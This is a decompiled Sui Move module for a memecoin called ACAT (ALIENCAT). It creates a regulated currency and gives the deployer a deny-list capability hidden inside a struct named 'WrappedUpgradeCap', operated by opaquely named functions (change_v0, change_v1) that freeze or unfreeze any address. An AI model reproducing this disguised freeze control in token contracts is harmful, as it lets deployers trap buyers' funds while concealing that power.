module 0xdccfc5587c91fac49cd2124c96449c4f0d68998a1d22b8ecf031ebe8697efa4b::acat {
    struct ACAT has drop {
        dummy_field: bool,
    }

    struct WrappedUpgradeCap has store, key {
        id: 0x2::object::UID,
        denyCap: 0x2::coin::DenyCapV2<ACAT>,
    }

    public fun change_v0(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut WrappedUpgradeCap, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<ACAT>(arg0, &mut arg1.denyCap, arg2, arg3);
    }

    public fun change_v1(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut WrappedUpgradeCap, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<ACAT>(arg0, &mut arg1.denyCap, arg2, arg3);
    }

    fun init(arg0: ACAT, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<ACAT>(arg0, 6, b"ACAT", b"ALIENCAT", b"The alien cat is a term often used to describe fictional or imaginative feline-like extraterrestrial creatures in science fiction, art, or pop culture. While they vary in appearance depending on the creative source, the concept of an alien cat usually blends feline grace and mystery with otherworldly features", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://pump.mypinata.cloud/ipfs/QmUBtxPbX8YfHKzie827hP2YZfueztrXkPk5LENo4jXRHB?img-width=256&img-dpr=2&img-onerror=redirect"))), false, arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<ACAT>>(v2);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<ACAT>>(v0, 0x2::tx_context::sender(arg1));
        let v3 = WrappedUpgradeCap{
            id      : 0x2::object::new(arg1),
            denyCap : v1,
        };
        0x2::transfer::public_transfer<WrappedUpgradeCap>(v3, 0x2::tx_context::sender(arg1));
    }

    // decompiled from Move bytecode v6
}

